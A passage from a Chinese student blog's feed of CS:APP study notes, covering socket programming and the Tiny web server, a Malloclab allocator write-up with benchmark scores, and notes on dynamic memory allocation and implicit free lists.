&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;struct sockaddr_in { 
	uint16_t sin_family; /* Protocol family (always AF_INET) */ 
	uint16_t sin_port; /* Port num in network byte order */ 
	struct in_addr sin_addr; /* IP addr in network byte order */ 
	unsigned char sin_zero[8]; /* Pad to sizeof(struct sockaddr) */ 
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250210191248.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;一个简单的串行C/S交互图:
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250210210410.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;创建socket文件描述符&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int socket(int domain, int type, int protocol);
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;绑定socket&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int bind(int sockfd, struct sockaddr *addr, socklen_t addrlen);
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;监听socket&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int listen(int sockfd, int backlog);
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;接收请求,返回另一个用于I/O的socket&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int accept(int listenfd, struct sockaddr *addr, int *addrlen);
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;请求连接&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int connect(int clientfd, struct sockaddr *addr, socklen_t addrlen);
&lt;/code&gt;&lt;/pre&gt;
 &lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250210234746.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;最佳实践,是利用&lt;code&gt;getaddrinfo&lt;/code&gt;函数返回的信息.&lt;/p&gt;
&lt;ol start=&quot;6&quot;&gt;
&lt;li&gt;&lt;code&gt;getaddrinfo&lt;/code&gt;函数:查询处理主机名,主机地址,端口,协议等信息.
 优点:同时适用于IPv4和IPv6;可重入(能安全用于多线程程序)&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int getaddrinfo(const char *host, /* Hostname or address */ 
                const char *service, /* Port or service name */ 
                const struct addrinfo *hints,/* Input parameters */ 
                struct addrinfo **result); /* Output linked list */ 
                
void freeaddrinfo(struct addrinfo *result); /* Free linked list */ 
const char *gai_strerror(int errcode); /* Return error msg */
&lt;/code&gt;&lt;/pre&gt;
 &lt;code&gt;getaddrinfo&lt;/code&gt;函数返回的结果是一个链表:
 &lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250210213057.png&quot; alt=&quot;&quot;&gt;
 包含主机的规范名,IP地址等信息.
 对于客户端,遍历这个链表直到socket调用&lt;code&gt;connect&lt;/code&gt;成功;
 对于服务端,遍历这个链表直到socket调用&lt;code&gt;bind&lt;/code&gt;成功.
 链表的每个节点是一个&lt;code&gt;addinfo struct&lt;/code&gt;结构体:&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;struct addrinfo { 
    int ai_flags; /* Hints argument flags */ 
    int ai_family; /* First arg to socket function */ 
    int ai_socktype; /* Second arg to socket function */ 
    int ai_protocol; /* Third arg to socket function */ 
    char *ai_canonname; /* Canonical host name */ 
    size_t ai_addrlen; /* Size of ai_addr struct */ 
    struct sockaddr *ai_addr; /* Ptr to socket address structure */ 
    struct addrinfo *ai_next; /* Ptr to next item in linked list */ 
};
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;用例&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;客户端获取服务器可连接的IP地址&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int open_clientfd(char *hostname, char *port) { 
    int clientfd; 
    struct addrinfo hints, *listp, *p; /* Get a list of potential server addresses */ 
    memset(&amp;amp;hints, 0, sizeof(struct addrinfo)); 
    hints.ai_socktype = SOCK_STREAM; /* Open a connection */ 
    hints.ai_flags = AI_NUMERICSERV; /* …using numeric port arg. */ 
    hints.ai_flags |= AI_ADDRCONFIG; /* Recommended for connections */ 
    Getaddrinfo(hostname, port, &amp;amp;hints, &amp;amp;listp);
    /* Walk the list for one that we can successfully connect to */ 
    for (p = listp; p; p = p-&amp;gt;ai_next) { 
        /* Create a socket descriptor */ 
        if ((clientfd = socket(p-&amp;gt;ai_family, p-&amp;gt;ai_socktype, p-&amp;gt;ai_protocol)) &amp;lt; 0) 
            continue; /* Socket failed, try the next */ 
            
        /* Connect to the server */ 
        if (connect(clientfd, p-&amp;gt;ai_addr, p-&amp;gt;ai_addrlen) != -1) 
            break; /* Success */ 
        Close(clientfd); /* Connect failed, try another */ 
    } 
    
    /* Clean up */ 
    Freeaddrinfo(listp); 
    if (!p) /* All connects failed */ 
        return -1; 
    else /* The last connect succeeded */ 
        return clientfd; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;服务器创建监听套接字&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int open_listenfd(char *port) { 
    struct addrinfo hints, *listp, *p; 
    int listenfd, optval=1; /* Get a list of potential server addresses */ 
    memset(&amp;amp;hints, 0, sizeof(struct addrinfo)); 
    hints.ai_socktype = SOCK_STREAM; /* Accept connect. */ 
    hints.ai_flags = AI_PASSIVE | AI_ADDRCONFIG; /* …on any IP addr */ 
    hints.ai_flags |= AI_NUMERICSERV; /* …using port no. */ 
    Getaddrinfo(NULL, port, &amp;amp;hints, &amp;amp;listp);
    
    /* Walk the list for one that we can bind to */ 
    for (p = listp; p; p = p-&amp;gt;ai_next) { 
        /* Create a socket descriptor */ 
        if ((listenfd = socket(p-&amp;gt;ai_family, p-&amp;gt;ai_socktype, p-&amp;gt;ai_protocol)) &amp;lt; 0) 
            continue; /* Socket failed, try the next */ 
        
        /* Eliminates &amp;quot;Address already in use&amp;quot; error from bind */ 
        Setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, (const void *)&amp;amp;optval , sizeof(int)); 
        
        /* Bind the descriptor to the address */ 
        if (bind(listenfd, p-&amp;gt;ai_addr, p-&amp;gt;ai_addrlen) == 0) 
            break; /* Success */ 
        Close(listenfd); /* Bind failed, try the next */ 
    }
    /* Clean up */ 
    Freeaddrinfo(listp); 
    if (!p) /* No address worked */ 
        return -1; 
        
    /* Make it a listening socket ready to accept conn. requests */ 
    if (listen(listenfd, LISTENQ) &amp;lt; 0) { 
        Close(listenfd); 
        return -1; 
    } 
    return listenfd; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;getnameinfo&lt;/code&gt;函数:根据IP地址查询域名&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int getnameinfo(const struct sockaddr *sa, 
				socklen_t salen, /* In: socket addr */ 
				char *host, size_t hostlen, /* Out: host */ 
				char *serv, size_t servlen, /* Out: service */ 
				int flags);                 /* optional flags */
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;与&lt;code&gt;getaddrinfo&lt;/code&gt;类似.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Web服务器&lt;/h1&gt;
&lt;p&gt;服务器和客户端交流使用的应用层协议是超文本传输协议(HTTP).当前是版本HTTP/1.1&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;动态和静态内容
  静态内容:HTML,图片
  动态内容:根据客户端的行为,有服务器执行程序产生.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;HTTP请求&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;method&amp;gt; &amp;lt;uri&amp;gt; &amp;lt;version&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;  &lt;code&gt;&amp;lt;method&amp;gt;&lt;/code&gt;可以是GET,POST,OPTIONS,HEAD,PUT,DELETE,TRACE
  &lt;code&gt;&amp;lt;uri&amp;gt;&lt;/code&gt;是统一资源标识符
  &lt;code&gt;&amp;lt;version&amp;gt;&lt;/code&gt;是HTTP版本(HTTP/1.0或HTTP/1.1)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Tiny服务器&lt;/h2&gt;
&lt;p&gt;Tiny服务器是本课程提供的一个Web服务器示例,只有200多行C语言代码.可以请求静态和动态内容.
请求方式是:
&lt;code&gt;GET &amp;lt;URI&amp;gt; &amp;lt;version&amp;gt;&lt;/code&gt;
动态内容在&lt;code&gt;/cgi-bin/&lt;/code&gt;下
	&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250211110110.png&quot; alt=&quot;&quot;&gt;
   &lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250211110132.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这个子进程通过通用网关接口(CGI:Common Gateway Interface)实现.
目前, cgi-bin里面有一个程序adder,通过设置URI为
/cgi-bin/adder?15213&amp;amp;18213
将参数传给程序.
变量从&amp;quot;?&amp;quot;起始,用&amp;quot;&amp;amp;&amp;quot;分隔.如果用空格,用&amp;quot;+&amp;quot;或&amp;quot;%20&amp;quot;.
CGI程序直接将输出重定向到客户端的套接字.&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Sun, 09 Feb 2025 16:00:00 GMT</pubDate></item><item><title>Malloclab</title><link>https://tankimzeg.top/blog/csapp/malloclab/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/malloclab/</guid><description>Malloclab records</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/malloclab/&quot;&gt;https://tankimzeg.top/blog/csapp/malloclab/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;准备工作&lt;/h1&gt;
&lt;p&gt;为方便GDB调试,修改Makefile:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-cmake&quot;&gt;CC = gcc -g
CFLAGS = -Wall -O0 -m32
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;值得注意的是,这里的 &lt;code&gt;-m32&lt;/code&gt;标签强制使用32位编译,也就是说,相当于32位系统,指针大小是4字节!一开始没注意,导致了很多困惑.&lt;/p&gt;
&lt;p&gt;下载12个traces文件,修改config.h:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;//#define TRACEDIR &amp;quot;/afs/cs/project/ics2/im/labs/malloclab/traces/&amp;quot;  
#define TRACEDIR &amp;quot;./traces/&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;本次实验可以2个人合作(话说两个人怎么写一份代码啊?设计不同怎么兼容,一起找bug还可行点).&lt;/p&gt;
&lt;p&gt;需要我写4个函数,实现堆管理:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;mm_init&lt;/code&gt;:堆初始化&lt;/li&gt;
&lt;li&gt;&lt;code&gt;mm_malloc&lt;/code&gt;:自己实现&lt;code&gt;malloc&lt;/code&gt;函数的功能&lt;/li&gt;
&lt;li&gt;&lt;code&gt;mm_free&lt;/code&gt;:自己实现&lt;code&gt;free&lt;/code&gt;函数的功能&lt;/li&gt;
&lt;li&gt;&lt;code&gt;mm_realloc&lt;/code&gt;:自己实现&lt;code&gt;realloc&lt;/code&gt;函数的功能
除此之外,还有5分落在了堆一致性检查器上:&lt;/li&gt;
&lt;li&gt;free列表里的块都标记为free&lt;/li&gt;
&lt;li&gt;没有连续的free块&lt;/li&gt;
&lt;li&gt;free块都在free里
等等.我主要用的第一个功能.找bug的时候自己检查,这确实是个好建议,稍微有点帮助.因为./mdrive给的错误信息实在太少了...&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;代码解释&lt;/h1&gt;
&lt;p&gt;我使用的策略是隔离空闲块列表 + first fit + 头插法.
在config.h文件中指明了最大堆空间:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#define MAX_HEAP (20*(1&amp;lt;&amp;lt;20))  /* 20 MB */
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;所以根据2的幂可以确定seglist的元素个数.&lt;/p&gt;
&lt;p&gt;写代码的过程依旧难以言说,与bug进行各种博弈...翻来覆去能改好几遍.具体见代码的注释,都是写代码过程中所思所想,很仔细了.&lt;/p&gt;
&lt;p&gt;mm_realloc函数主体很长,模块化较差,因为情况实在太多了,不是很满意...&lt;/p&gt;
&lt;p&gt;有一个很坑的点,当 &lt;code&gt;memcpy&lt;/code&gt;的内存区域重叠时就不要使用了会有奇怪的bug(填充别的字符),改用功能一样的&lt;code&gt;memmove&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;realloc改进前:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;Results for mm malloc:
trace  valid  util     ops      secs  Kops
 0       yes   98%    5694  0.000421 13512
 1       yes   98%    5848  0.000426 13721
 2       yes   97%    6648  0.000456 14576
 3       yes   99%    5380  0.000370 14525
 4       yes  100%   14400  0.000661 21795
 5       yes   92%    4800  0.000455 10561
 6       yes   90%    4800  0.000379 12672
 7       yes   55%   12000  0.000590 20353
 8       yes   51%   24000  0.001004 23892
 9       yes   58%   14401  0.001003 14358
10       yes   45%   14401  0.000662 21754
Total          80%  112372  0.006427 17484

Perf index = 48 (util) + 40 (thru) = 88/100
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;realloc的利用率不理想,我想了一下,结合别人的方法的点拨[^1],我一下子就发现了原因.&lt;/p&gt;
&lt;p&gt;原始的split函数总是分割前部,后部空闲.这会导致后部被别的占用,realloc扩大就只能另寻&lt;/p&gt;
&lt;p&gt;如果大块的使用后部,小块的使用前部,就可以大大提升利用率!&lt;/p&gt;
&lt;p&gt;这种想法当然是对的,要应用得好还需要考虑很多细节.&lt;/p&gt;
&lt;p&gt;这里我仅是将realloc里面的split全部改用split_post,没有区别对待大小,利用率已经有了很大提升!&lt;/p&gt;
&lt;p&gt;[^1]:&lt;a href=&quot;https://zhuanlan.zhihu.com/p/374478609&quot;&gt;高性能 Malloc Lab —— 不上树 97/100&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;结果&lt;/h1&gt;
&lt;p&gt;采用split_post改进后:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ make &amp;amp;&amp;amp; ./mdriver -a -v
make: &amp;#39;mdriver&amp;#39; is up to date.
Using default tracefiles in ./traces/
Measuring performance with gettimeofday().

Results for mm malloc:
trace  valid  util     ops      secs  Kops
 0       yes   98%    5694  0.000314 18151
 1       yes   98%    5848  0.000405 14429
 2       yes   97%    6648  0.000449 14823
 3       yes   99%    5380  0.000358 15028
 4       yes  100%   14400  0.000595 24218
 5       yes   92%    4800  0.000427 11254
 6       yes   90%    4800  0.000391 12279
 7       yes   55%   12000  0.000567 21160
 8       yes   51%   24000  0.000929 25826
 9       yes   94%   14401  0.025577   563
10       yes  100%   14401  0.000833 17284
Total          89%  112372  0.030844  3643

Perf index = 53 (util) + 40 (thru) = 93/100
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;总结/优化方向&lt;/h1&gt;
&lt;p&gt;隔离空闲块列表 + first fit + 头插法达到了93分,还算可以吧,比网上一些八十几分的强多了.模块之间嵌合得太紧了,再优化需要动很多结构,暂时就不折腾了.&lt;/p&gt;
&lt;p&gt;吞吐量满分就是40,很容易得满分,提高利用率才是关键.优化方向可以是:头插法-&amp;gt;按地址排序;first fit -&amp;gt; best fit.甚至一些课上不讲的算法,什么二叉搜索树可能也能用上...&lt;/p&gt;
&lt;p&gt;本次的代码量比较大,约500行,比上一次的Cachelab还大,我自己写的那个网络应用更是小卡拉米hhh.&lt;/p&gt;
&lt;p&gt;总共写了两天半的时间,也花了不少时间用GDB调试,希望对自己的代码能力有比较好的提升吧!&lt;/p&gt;
&lt;h1&gt;源代码&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;见&lt;a href=&quot;https://github.com/PrekrasnoyeDalekov/CS-APP/blob/main/labs/malloclab/mm.c&quot;&gt;mm.c&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Fri, 07 Feb 2025 16:00:00 GMT</pubDate></item><item><title>动态内存分配(基本概念)</title><link>https://tankimzeg.top/blog/csapp/dynamic-memory-allocation-i/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/dynamic-memory-allocation-i/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/dynamic-memory-allocation-i/&quot;&gt;https://tankimzeg.top/blog/csapp/dynamic-memory-allocation-i/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;基本概念&lt;/h1&gt;
&lt;p&gt;使用动态内存分配在运行时请求虚拟内存.用于在运行时才确定大小的数据结构.
动态内存分配管理虚拟内存中的&lt;strong&gt;堆&lt;/strong&gt;.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250207115740.png&quot; alt=&quot;&quot;&gt;
分配器将堆维护为连续的变大小的块的集合,块能被分配或释放.
分配器的类型:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;显式分配器:显式分配,显式释放
  例如C语言的&lt;code&gt;malloc&lt;/code&gt;和&lt;code&gt;free&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;隐式分配器:显式分配,系统隐式释放
  例如JAVA,python的垃圾回收机制&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;动态内存分配函数包&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;malloc&lt;/code&gt;, &lt;code&gt;free&lt;/code&gt;, &lt;code&gt;calloc&lt;/code&gt;, &lt;code&gt;realloc&lt;/code&gt;, &lt;code&gt;sbrk&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;void *malloc(size_t size)&lt;/code&gt;:
  成功:返回指向至少size字节(x86-64为16字节边界对齐)的块的指针;如果size=0,返回NULL
  失败返回空指针并设置errno.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;void free(void *p)&lt;/code&gt;:
  p必须是之前动态内存分配的指针&lt;/li&gt;
&lt;li&gt;&lt;code&gt;calloc&lt;/code&gt;:	初始化为0&lt;/li&gt;
&lt;li&gt;&lt;code&gt;realloc&lt;/code&gt;:改变之前分配的块的大小&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sbrk&lt;/code&gt;: 在分配器内部用于增长或缩小堆&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;约束&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;程序&lt;ul&gt;
&lt;li&gt;任意使用分配/释放函数&lt;/li&gt;
&lt;li&gt;释放的必须是动态分配的指针&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;分配器&lt;ul&gt;
&lt;li&gt;不能控制分配的块的大小&lt;/li&gt;
&lt;li&gt;请求分配必须立即响应,不能积攒&lt;/li&gt;
&lt;li&gt;只能从空余空间分配&lt;/li&gt;
&lt;li&gt;满足对齐原则&lt;/li&gt;
&lt;li&gt;不能移动分配的块&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;性能目标&lt;/h2&gt;
&lt;p&gt;由于分配器有诸多限制和约束,评估它的性能就很重要.
对于给定的一系列&lt;code&gt;malloc&lt;/code&gt;和&lt;code&gt;free&lt;/code&gt;请求:
	$R_{0},R_{1},\dots,R_{k},\dots,R_{n-1}$&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;吞吐量
 提高单位时间处理分配释放请求的次数&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;峰值内存利用率&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;定义:有效载荷$P_{k}$&lt;ul&gt;
&lt;li&gt;&lt;code&gt;malloc(p)&lt;/code&gt;导致有效载荷p字节&lt;/li&gt;
&lt;li&gt;$R_{k}$请求后,有效载荷$P_{k}=\sum p_{i}$&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;定义:当前堆大小$H_{k}$&lt;ul&gt;
&lt;li&gt;假设堆不减小&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;定义:峰值内存利用率&lt;ul&gt;
&lt;li&gt;$U_{k}=\frac{max_{i\leq k}P_{i}}{H_{k}}$&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 分配器的目标就是在整个请求序列中使$U_{n-1}$最大化.
 完美的内存利用率是1.但实际上由于对齐原则,不可避免地产生&lt;strong&gt;碎片&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;碎片(Fragmentation)&lt;/h2&gt;
&lt;p&gt;低内存利用率是由碎片导致的.
有两种碎片类型:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;内部碎片&lt;/li&gt;
&lt;li&gt;外部碎片&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;内部碎片&lt;/h3&gt;
&lt;p&gt;如果有效载荷小于块大小,称为内部碎片
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250207153101.png&quot; alt=&quot;&quot;&gt;
原因:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;分配器需要维护一种堆的数据结构&lt;/li&gt;
&lt;li&gt;对齐原则:块中的填充&lt;/li&gt;
&lt;li&gt;策略决定:返回大块来确保小块请求的安全&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;取决于语句自身,容易评估.&lt;/p&gt;
&lt;h3&gt;外部碎片&lt;/h3&gt;
&lt;p&gt;有足够多的堆内存,但没有一个块是足够大的.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250207153923.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;取决于前后请求,难以评估.&lt;/p&gt;
&lt;h1&gt;追踪空块&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;[[#隐式空闲块列表|隐式空闲块列表]](implicit list)
 用长度连接所有块.
 &lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250207161200.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;li&gt;[[动态内存分配(进阶概念)#显式空闲块列表|显式空闲块列表]](explicit list)
 在用指针指示空闲块
 &lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250207161308.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;li&gt;[[动态内存分配(进阶概念)#隔离空闲块列表|隔离空闲块列表]](segregated free list)
 多种空闲列表,每个包含特定大小或特定大小范围的块&lt;/li&gt;
&lt;li&gt;按大小排列的块
 使用平衡树将块按照大小来排序.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;隐式空闲块列表&lt;/h2&gt;
&lt;p&gt;由于块按字长对齐,字长通常低位有几个0,利用这些0来存储是否分配的信息.
在块中加上一个头部,指示块的大小/是否分配等信息.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250207161049.png&quot; alt=&quot;&quot;&gt;
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250207162314.png&quot; alt=&quot;&quot;&gt;
块的头部占有1字长,而载荷是double-word内存对齐的,所以头部没有double-word aligned.上图有效载荷是8字节对齐的,字长是4字节.
结束块是1个0字节的有效块.&lt;/p&gt;
&lt;h3&gt;寻找空闲块的算法&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;first fit:
 从列表开始处寻找,选择第一个合适的块:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;p = start;
while((p &amp;lt; end) &amp;amp;&amp;amp; ((*p &amp;amp; 1) || (*p &amp;lt;= len)))  // 加上头部大小
    p = p + (*p &amp;amp; -2);  // go to next block
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;next fit:
 从上次搜索结束的地方开始搜索
 虽然避免了一些重复搜索,但是导致更严重的碎片化&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;best fit:
 搜寻堆中所有块,找到最佳适配的块
 需要更多的时间,但提升了内存利用率&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;在空闲块中分配&lt;/h3&gt;
&lt;p&gt;通过上面的某种方式,已经找到了一个适配的块.接下来是对它进行修改以达到分配的目的.
在空闲块中分配:分割
分配的大小可能小于空闲的大小,所以需要分割
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250207164723.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void addblock(ptr p, int len) { 
	int newsize = ((len + 1) &amp;gt;&amp;gt; 1) &amp;lt;&amp;lt; 1;  // round up to even 
	int oldsize = *p &amp;amp; -2;                // mask out low bit 
	*p = newsize | 1;                     // set new length 
	if (newsize &amp;lt; oldsize) 
		*(p+newsize) = oldsize - newsize; // set length in remaining 
}                                         // part of block
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;释放块&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void free_block(ptr p){
	*p = *p &amp;amp; -2;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这会导致越来越多的碎片,所以需要合并空闲块&lt;/p&gt;
&lt;h3&gt;合并块&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250207171957.png&quot; alt=&quot;&quot;&gt;
现有的头部设计只能合并后面的空闲块,无法判断前一个块是空闲.
所以在块的设计中,加上边界标记boundary tag,形成类似双向链表模拟的数组:
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250207170029.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;合并的时间复杂度是常数:
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250207171729.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;缺点也明显:增加了内部碎片.
如何优化?
实际上只有空闲块需要脚标.然后,利用字长低位的另一个0来标志之前一个块是否是空闲状态.
具体来说,就是在释放一块,并且合并后面的空闲块后,整个空闲块设置脚标,并将下一个分配块设置前一个块是空闲的标记.
当以后释放块时,就可以直到前一个块是空闲的,然后退一个字长访问其脚标,得到这个空闲块的大小,向前合并.&lt;/p&gt;
&lt;h3&gt;分配器策略&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;放置策略
  first fit, next fit, best fit会造成吞吐量和碎片程度的差异,顾此失彼&lt;/li&gt;
&lt;li&gt;分割策略
  空闲块大于分配需要的大小就一定要分割吗?如果不分割,可能提升搜寻的效率,但会造成内部碎片的增加.&lt;/li&gt;
&lt;li&gt;合并策略
  在调用&lt;code&gt;free&lt;/code&gt;时立即合并;还是推迟合并,在下一次用&lt;code&gt;malloc&lt;/code&gt;扫描列表时再合并?&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;隐式空闲列表是这中间最简单的数据结构,然而已经有如此多需要考量的细节了.&lt;/p&gt;
&lt;h3&gt;总结&lt;/h3&gt;
&lt;p&gt;非常简单的设计,但分配时与堆的大小呈线性相关关系.
不用于&lt;code&gt;malloc&lt;/code&gt;和&lt;code&gt;free&lt;/code&gt;函数,因为效率太低了.
通过这种数据结构的学习,我们熟悉了一系列基本概念和块的设计.&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Thu, 06 Feb 2025 16:00:00 GMT</pubDate></item><item><title>程序优化(进阶概念)</title><link>https://tankimzeg.top/blog/csapp/dynamic-memory-allocation-ii/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/dynamic-memory-allocation-ii/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/dynamic-memory-allocation-ii/&quot;&gt;https://tankimzeg.top/blog/csapp/dynamic-memory-allocation-ii/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;(续)&lt;/p&gt;
&lt;h2&gt;显式空闲块列表&lt;/h2&gt;
&lt;p&gt;这是一个空闲块的列表,而非隐式列表那样的所有块的列表.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250207181225.png&quot; alt=&quot;&quot;&gt;
Next和Prev都是指向空闲块的指针.
仍然需要脚标来合并.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250207184658.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3&gt;分配块&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250207184810.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3&gt;释放块&lt;/h3&gt;
&lt;p&gt;插入策略:新释放的块插入到链表的什么位置?&lt;/p&gt;
&lt;ul&gt;
